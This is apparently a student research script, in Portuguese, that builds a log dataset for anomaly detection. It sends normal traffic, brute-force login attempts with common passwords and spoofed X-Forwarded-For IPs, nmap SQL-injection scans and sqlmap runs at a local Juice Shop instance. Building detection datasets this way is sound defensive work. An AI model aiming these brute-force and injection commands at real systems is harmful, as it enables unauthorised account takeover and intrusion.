"""
================================================================================
GERADOR DE DATASET v2.1 - Projeto de IC: Análise Preditiva
================================================================================
"""
import requests
import random
import subprocess
import threading
import warnings
import time
import logging
import shutil
from datetime import datetime

warnings.filterwarnings('ignore')

# ==========================================
# CONFIGURAÇÕES CENTRAIS (Foco em 10.000 Logs)
# ==========================================
CONFIG = {
    "alvo": "http://localhost:80",
    "total_normal": 8500,       # Aumentado para compor os ~10k totais
    "total_forca_bruta": 1500,  # Aumentado para gerar volume anômalo robusto
    "timeout_requisicao": 3,
    "log_execucao": f"execucao_gerador_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log",
}

# IPs simulados
IPS_SIMULADOS_NORMAIS = [f"192.168.1.{i}" for i in range(10, 60)]
IPS_SIMULADOS_ATACANTES = ["10.0.0.1", "10.0.0.2", "172.16.0.99", "185.220.101.5"]

# Pool de User-Agents reais para TODOS (evita vazamento de dados na IA)
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15"
]

ENDPOINTS_NORMAIS = [
    "/", "/#/search", "/api/Products", "/api/Feedbacks",
    "/assets/public/images/products/apple_juice.jpg",
    "/rest/user/whoami", "/assets/i18n/pt_BR.json",
    "/#/login", "/#/register", "/#/about",
    "/api/Products/1", "/api/Products/2", "/api/Products/3",
]

SENHAS_BRUTA = ["admin", "123456", "password", "admin123", "root", "test", "guest"]
EMAILS_BRUTA = ["admin@juice-sh.op", "test@test.com", "user@example.com"]

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s",
                    handlers=[logging.FileHandler(CONFIG["log_execucao"]), logging.StreamHandler()])
log = logging.getLogger(__name__)

def verificar_dependencias():
    tem_nmap = shutil.which("nmap") is not None
    tem_docker = shutil.which("docker") is not None
    if not tem_nmap: log.warning("Nmap NÃO encontrado. Pulo de varredura.")
    if not tem_docker: log.warning("Docker NÃO encontrado. Pulo de SQLMap.")
    return tem_nmap, tem_docker

def verificar_conectividade():
    log.info(f"Testando conectividade com o alvo: {CONFIG['alvo']} ...")
    try:
        r = requests.get(CONFIG["alvo"], timeout=5)
        log.info(f"✔ Alvo respondeu com status {r.status_code}. Pronto!")
        return True
    except:
        log.error("✘ Falha de conexão! Verifique se o Nginx está rodando.")
        return False

def gerar_trafego_normal():
    log.info(f"Gerando {CONFIG['total_normal']} requisições normais...")
    sucesso, falhas = 0, 0
    for i in range(CONFIG["total_normal"]):
        headers = {
            "X-Forwarded-For": random.choice(IPS_SIMULADOS_NORMAIS),
            "User-Agent": random.choice(USER_AGENTS)
        }
        try:
            requests.get(f"{CONFIG['alvo']}{random.choice(ENDPOINTS_NORMAIS)}", headers=headers, timeout=CONFIG["timeout_requisicao"])
            sucesso += 1
            if sucesso % 1000 == 0: log.info(f"  -> Progresso: {sucesso}/{CONFIG['total_normal']} acessos normais...")
        except: falhas += 1
    log.info(f"✔ Tráfego normal finalizado. Sucesso: {sucesso} | Falhas: {falhas}")

def gerar_forca_bruta_http():
    log.info(f"Gerando {CONFIG['total_forca_bruta']} tentativas de força bruta HTTP...")
    ip_atacante = random.choice(IPS_SIMULADOS_ATACANTES)
    sucesso = 0
    for i in range(CONFIG["total_forca_bruta"]):
        payload = {"email": random.choice(EMAILS_BRUTA), "password": random.choice(SENHAS_BRUTA)}
        headers = {
            "X-Forwarded-For": ip_atacante,
            "Content-Type": "application/json",
            "User-Agent": random.choice(USER_AGENTS) # CORREÇÃO: IA não pode colar pelo UA!
        }
        try:
            requests.post(f"{CONFIG['alvo']}/rest/user/login", json=payload, headers=headers, timeout=CONFIG["timeout_requisicao"])
            sucesso += 1
        except: pass
        time.sleep(0.01) # Acelerado levemente para 1500 logs
    log.info(f"✔ Força bruta finalizada ({sucesso} envios do IP {ip_atacante}).")

def disparar_nmap():
    log.info("Disparando varredura Nmap...")
    try:
        subprocess.run(["nmap", "-p", "80", "--script", "http-enum,http-sql-injection", "-T4", "localhost"], capture_output=True, timeout=120)
        log.info("✔ Nmap finalizado.")
    except Exception as e: log.error(f"Erro Nmap: {e}")

def disparar_sqlmap():
    log.info("Disparando SQLMap via Docker...")
    try:
        subprocess.run(["docker", "run", "--rm", "secsi/sqlmap", "-u", "http://host.docker.internal/rest/products/search?q=apple", "-p", "q", "--level=2", "--risk=2", "--batch", "--timeout=10"], capture_output=True, timeout=180)
        log.info("✔ SQLMap finalizado.")
    except Exception as e: log.error(f"Erro SQLMap: {e}")

if __name__ == "__main__":
    inicio = datetime.now()
    print("=" * 60)
    print("🏭  GERADOR DE DATASET v2.1 — 10.000+ Logs")
    print("=" * 60)
    
    tem_nmap, tem_docker = verificar_dependencias()
    if not verificar_conectividade(): exit(1)
    
    threads = []
    if tem_nmap: threads.append(threading.Thread(target=disparar_nmap))
    if tem_docker: threads.append(threading.Thread(target=disparar_sqlmap))
    threads.append(threading.Thread(target=gerar_forca_bruta_http))
    
    for t in threads: t.start()
    gerar_trafego_normal()
    for t in threads: t.join()

    duracao = (datetime.now() - inicio).seconds
    log.info(f"✅  Dataset gerado com sucesso em {duracao}s! Aguarde 30s para o Logstash indexar.")